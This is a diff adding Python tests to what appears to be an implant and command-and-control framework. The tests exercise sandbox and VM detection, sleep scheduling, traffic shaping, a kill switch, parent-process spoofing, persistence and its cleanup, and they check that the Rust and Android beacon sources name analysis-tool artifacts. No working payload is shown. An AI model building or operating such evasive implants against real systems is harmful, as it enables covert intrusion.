@@ -4034,3 +4034,329 @@ def test_the_consistency_checker_knows_the_techniques():
     assert "registry.run" in techniques
     assert "systemd.user" in techniques
     assert "boot_receiver" not in techniques  # that one is the phone's
+
+
+# ---------------------------------------------------------------------------
+# The posture engine
+# ---------------------------------------------------------------------------
+
+
+def test_the_posture_engine_classifies_the_host():
+    """The implant says what the host looks like, and how sure it is."""
+    sys.path.insert(0, os.path.join(ROOT, "tools"))
+    from mock_server import FakeAgent, MockServer  # noqa: WPS433
+    from umbra_cli.client import OperatorClient  # noqa: WPS433
+
+    token = b"posture-token-0123456789abcd"
+    server = MockServer(AGENT_PSK, {"alice": token})
+    server.start()
+    agent = FakeAgent(server.address, AGENT_PSK, "agent-posture", interval=0.2)
+    agent.start()
+
+    client = OperatorClient(server.address, token.decode(), "alice")
+    try:
+        client.connect()
+        deadline = time.time() + 5
+        while time.time() < deadline and not client.agents():
+            time.sleep(0.05)
+        assert client.agents()
+
+        task = client.wait_for_result(
+            client.submit("agent-posture", "evade.report", {}), timeout=10)
+        assert task["state"] == "done", task
+        meta = task.get("meta") or {}
+        posture = meta.get("posture") or {}
+        assert posture, task
+        assert posture["label"]
+        assert "virtual" in posture
+        assert "sandbox" in posture
+        assert posture["confidence"] >= 0
+        assert "posture_sleep_factor" in meta
+        assert "posture:" in (task.get("out") or b"").decode()
+    finally:
+        client.close()
+        agent.stop()
+        server.stop()
+
+
+def test_the_server_keeps_the_posture_of_every_host():
+    """What the implant reported is what the inventory shows."""
+    sys.path.insert(0, os.path.join(ROOT, "tools"))
+    from mock_server import FakeAgent, MockServer  # noqa: WPS433
+    from umbra_cli.client import OperatorClient  # noqa: WPS433
+
+    token = b"posture-record-token-01234567"
+    server = MockServer(AGENT_PSK, {"alice": token})
+    server.start()
+    agent = FakeAgent(server.address, AGENT_PSK, "agent-posture-2", interval=0.2)
+    agent.start()
+
+    client = OperatorClient(server.address, token.decode(), "alice")
+    try:
+        client.connect()
+        deadline = time.time() + 5
+        while time.time() < deadline and not client.agents():
+            time.sleep(0.05)
+
+        client.wait_for_result(
+            client.submit("agent-posture-2", "evade.report", {}), timeout=10)
+        rows = client.agents()
+        assert rows, "the agent is missing"
+        posture = rows[0].get("posture") or {}
+        assert posture, rows[0]
+        assert posture.get("label")
+
+        # The fleet report reads the record, it does not touch the host.
+        from umbra_cli.client import OperatorClient as _Client  # noqa: WPS433
+        report = _Client.posture_report(client)
+        assert report and report[0]["label"]
+    finally:
+        client.close()
+        agent.stop()
+        server.stop()
+
+
+def test_the_kill_switch_is_armed_and_can_be_cleared():
+    """The moment the implant stops existing is the operator's decision."""
+    sys.path.insert(0, os.path.join(ROOT, "tools"))
+    from mock_server import FakeAgent, MockServer  # noqa: WPS433
+    from umbra_cli.client import OperatorClient  # noqa: WPS433
+
+    token = b"killswitch-token-0123456789ab"
+    server = MockServer(AGENT_PSK, {"alice": token})
+    server.start()
+    agent = FakeAgent(server.address, AGENT_PSK, "agent-kill", interval=0.2)
+    agent.start()
+
+    client = OperatorClient(server.address, token.decode(), "alice")
+    try:
+        client.connect()
+        deadline = time.time() + 5
+        while time.time() < deadline and not client.agents():
+            time.sleep(0.05)
+
+        task = client.wait_for_result(
+            client.submit("agent-kill", "evade.killswitch", {"file": "/tmp/stop-me"}),
+            timeout=10)
+        assert task["state"] == "done", task
+        switch = (task.get("meta") or {}).get("killswitch") or {}
+        assert switch.get("armed") is True, task
+        assert "armed" in (task.get("out") or b"").decode()
+
+        # A kill switch without a trigger is refused.
+        task = client.wait_for_result(
+            client.submit("agent-kill", "evade.killswitch", {}), timeout=10)
+        assert task["state"] == "failed", task
+        assert task["code"] != 0, task
+        assert "killswitch" in (task.get("err") or "")
+
+        # And it can be disarmed again.
+        task = client.wait_for_result(
+            client.submit("agent-kill", "evade.killswitch", {"clear": True}), timeout=10)
+        assert task["state"] == "done", task
+        switch = (task.get("meta") or {}).get("killswitch") or {}
+        assert switch.get("armed") is False, task
+    finally:
+        client.close()
+        agent.stop()
+        server.stop()
+
+
+def test_the_schedule_and_the_shape_are_configurable():
+    """The day and the traffic are the operator's decision."""
+    sys.path.insert(0, os.path.join(ROOT, "tools"))
+    from mock_server import FakeAgent, MockServer  # noqa: WPS433
+    from umbra_cli.client import OperatorClient  # noqa: WPS433
+
+    token = b"schedule-token-0123456789abc"
+    server = MockServer(AGENT_PSK, {"alice": token})
+    server.start()
+    agent = FakeAgent(server.address, AGENT_PSK, "agent-schedule", interval=0.2)
+    agent.start()
+
+    client = OperatorClient(server.address, token.decode(), "alice")
+    try:
+        client.connect()
+        deadline = time.time() + 5
+        while time.time() < deadline and not client.agents():
+            time.sleep(0.05)
+
+        task = client.wait_for_result(
+            client.submit("agent-schedule", "evade.profile",
+                          {"base": 90, "busy_factor": 40, "night_factor": 200}),
+            timeout=10)
+        assert task["state"] == "done", task
+        schedule = (task.get("meta") or {}).get("schedule") or {}
+        assert schedule.get("base") == 90, task
+        assert schedule.get("night_factor") == 200, task
+
+        task = client.wait_for_result(
+            client.submit("agent-schedule", "evade.shape",
+                          {"mode": "fixed", "size": 2048, "reorder": True}),
+            timeout=10)
+        assert task["state"] == "done", task
+        shaping = (task.get("meta") or {}).get("shaping") or {}
+        assert shaping.get("mode") == "fixed", task
+        assert shaping.get("size") == 2048, task
+    finally:
+        client.close()
+        agent.stop()
+        server.stop()
+
+
+def test_the_console_knows_the_evasion_commands():
+    """The parser and the client know every evasion command."""
+    sys.path.insert(0, os.path.join(ROOT, "operator"))
+    from umbra_cli import cli  # noqa: WPS433
+
+    parser = cli.build_parser()
+    report = parser.parse_args(["evade-report"])
+    assert report.cmd == "evade-report" and report.agent == ""
+
+    posture = parser.parse_args(["evade-posture", "web-01", "--silence",
+                                 "--sandbox-factor", "300"])
+    assert posture.cmd == "evade-posture"
+    assert posture.silence is True
+    assert posture.sandbox_factor == 300
+
+    profile = parser.parse_args(["evade-profile", "web-01", "--base", "120",
+                                 "--night-factor", "200"])
+    assert profile.base == 120 and profile.night_factor == 200
+
+    shape = parser.parse_args(["evade-shape", "web-01", "--mode", "fixed",
+                               "--size", "4096", "--reorder"])
+    assert shape.mode == "fixed" and shape.size == 4096 and shape.reorder is True
+
+    kill = parser.parse_args(["evade-killswitch", "web-01", "--file", "/tmp/stop",
+                              "--uptime", "72"])
+    assert kill.file == "/tmp/stop" and kill.uptime == 72
+
+    hygiene = parser.parse_args(["hygiene", "web-01", "--memory"])
+    assert hygiene.cmd == "hygiene" and hygiene.memory is True
+
+    from umbra_cli.client import OperatorClient  # noqa: WPS433
+    assert hasattr(OperatorClient, "posture_report")
+
+
+def test_the_rust_beacon_owns_the_posture_engine():
+    """The engine, the schedule, the shaping and the kill switch are Rust."""
+    evade = read_text("implant/rust/src/evade.rs")
+    assert "pub struct Posture" in evade
+    assert "pub enum ShapeMode" in evade
+    assert "pub struct SleepProfile" in evade
+    assert "pub enum Trigger" in evade
+    assert "pub struct Window" in evade
+    assert "pub fn classify" in evade
+    assert "pub silence_on_sandbox: bool" in evade
+    assert "pub fn schedule" in evade
+    assert "pub fn marker_fired" in evade
+    assert "VMwareTools" in evade
+    assert "SbieDll" in evade
+    assert "x64dbg" in evade
+
+    # The beacon draws the window once per cycle and checks the kill switch
+    # before it talks to the server again.
+    beacon = read_text("implant/rust/src/beacon.rs")
+    assert "Window::schedule" in beacon
+    assert "fn kill_switch" in beacon
+    assert "fn terminate" in beacon
+    assert "shaping.reorder" in beacon
+
+    # The memory hygiene has a guard of its own.
+    crypto = read_text("implant/rust/src/crypto.rs")
+    assert "pub struct Zeroizing" in crypto
+    assert "pub trait Zeroize" in crypto
+    task = read_text("implant/rust/src/task.rs")
+    assert "Zeroizing::new" in task
+    hygiene = read_text("implant/rust/src/hygiene.rs")
+    assert "pub fn spoof_parent" in hygiene
+    assert "pub fn clean_environment" in hygiene
+    assert "pub fn copy_self" in hygiene
+
+
+def test_the_task_dispatcher_runs_the_evasion_kinds():
+    """Every evasion kind is dispatched and advertised."""
+    task = read_text("implant/rust/src/task.rs")
+    for kind in ("evade.report", "evade.posture", "evade.profile",
+                 "evade.shape", "evade.killswitch", "hygiene.memory",
+                 "hygiene.process"):
+        assert f'"{kind}"' in task, kind
+    # The capabilities travel with the handshake.
+    for kind in ("evade.report", "evade.killswitch", "hygiene.memory"):
+        assert f'"{kind}"' in task.split("pub fn capabilities")[1], kind
+
+
+def test_the_phone_runs_the_evasion_tasks():
+    """The phone has its own posture engine."""
+    evasion = read_text("implant/android/app/src/main/java/io/umbra/beacon/Evasion.kt")
+    assert "fun classify" in evasion
+    assert "fun factor" in evasion
+    assert "fun killSwitch" in evasion
+    assert "Build.FINGERPRINT" in evasion
+    assert "test-keys" in evasion
+
+    runner = read_text("implant/android/app/src/main/java/io/umbra/beacon/TaskRunner.kt")
+    for kind in ("evade.report", "evade.posture", "evade.profile",
+                 "evade.killswitch", "hygiene.memory"):
+        assert f'"{kind}"' in runner, kind
+    # The shaping and the process hygiene need the desktop implant.
+    assert 'unsupported("evade.shape"' in runner
+    assert 'unsupported("hygiene.process"' in runner
+
+
+def test_the_documentation_describes_the_posture_engine():
+    """The protocol, the runbook and the readme all mention it."""
+    protocol = read_text("docs/PROTOCOL.md")
+    for kind in ("evade.report", "evade.posture", "evade.profile",
+                 "evade.shape", "evade.killswitch", "hygiene.memory",
+                 "hygiene.process"):
+        assert f"| `{kind}` |" in protocol, kind
+    assert "7.2h The posture engine" in protocol
+    operations = read_text("docs/OPERATIONS.md")
+    assert "umbra evade-report" in operations
+    assert "umbra evade-killswitch" in operations
+    readme = read_text("README.md")
+    assert "Knowing the host" in readme
+
+
+def test_the_exit_takes_the_persistence_with_it():
+    """The last word of the operator leaves the target clean."""
+    sys.path.insert(0, os.path.join(ROOT, "tools"))
+    from mock_server import FakeAgent, MockServer  # noqa: WPS433
+    from umbra_cli.client import OperatorClient  # noqa: WPS433
+
+    token = b"exit-token-0123456789abcdef"
+    server = MockServer(AGENT_PSK, {"alice": token})
+    server.start()
+    agent = FakeAgent(server.address, AGENT_PSK, "agent-exit", interval=0.2)
+    agent.start()
+
+    client = OperatorClient(server.address, token.decode(), "alice")
+    try:
+        client.connect()
+        deadline = time.time() + 5
+        while time.time() < deadline and not client.agents():
+            time.sleep(0.05)
+
+        # An entry first, so there is something to take away.
+        client.wait_for_result(
+            client.submit("agent-exit", "persist", {"method": "auto"}), timeout=10)
+        rows = client.agents()
+        assert rows and rows[0].get("persist"), rows
+
+        # Then the implant goes, and the record follows it.
+        client.wait_for_result(
+            client.submit("agent-exit", "exit", {}), timeout=10)
+        deadline = time.time() + 5
+        while time.time() < deadline:
+            rows = client.agents()
+            if rows and not rows[0].get("persist"):
+                break
+            time.sleep(0.05)
+        rows = client.agents()
+        assert rows, "the agent is missing"
+        assert not rows[0].get("persist"), rows[0]
+    finally:
+        client.close()
+        agent.stop()
+        server.stop()
